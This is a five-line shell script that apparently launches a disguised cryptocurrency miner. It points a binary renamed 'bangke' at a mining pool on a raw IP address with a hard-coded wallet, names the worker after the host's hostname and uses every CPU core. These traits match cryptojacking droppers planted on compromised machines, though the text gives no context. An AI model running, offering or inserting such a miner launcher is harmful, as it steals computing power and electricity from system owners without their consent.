pool="172.104.176.128:80"
wallet="ZEPHs9wbP2kgeHU9wJoPonUwJAsZkj5rHagMgnDjK7186LuNVVfFeCGDByX2Y18AvbdRJQsNK4Fu4QM7XGs1bXegNGhthDhZ5ht"
workername="$(cat /proc/sys/kernel/hostname)"
thread="$(nproc --all)"
./bangke --url $pool --user $wallet --pass $workername -k -t$thread --donate-level 1